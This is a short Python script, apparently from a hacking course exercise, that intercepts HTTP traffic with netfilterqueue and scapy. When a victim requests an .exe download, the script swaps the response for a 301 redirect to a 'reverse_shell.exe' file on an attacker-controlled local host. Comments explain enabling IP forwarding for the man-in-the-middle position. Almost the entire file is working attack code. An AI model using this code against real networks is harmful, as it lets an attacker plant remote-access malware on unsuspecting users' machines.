#in this progran the funtions are created for task 
# In this we are intercepting files from remote host
#sysctl net.ipv4.ip_forward  --> command used to check status of ipforwarding
#echo 1 > /proc/sys/net/ipv4/ip_forward
#this cmd used to enable ip_forwarding which allow packets to flow packets through the linux machine
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    #setting packet to 
    packet[scapy.Raw].load = load
    # deleting some fields of IP and TCP header
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #if scapy_packet.haslayer(scapy.Raw):
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print "[+] exe request"
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print "[+] Replacing file"
                # redirecting request to my file location
                modified_packet = set_load(
                    scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.44.141/evil-files/reverse_shell.exe\n\n")
                # sent the modified packet
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
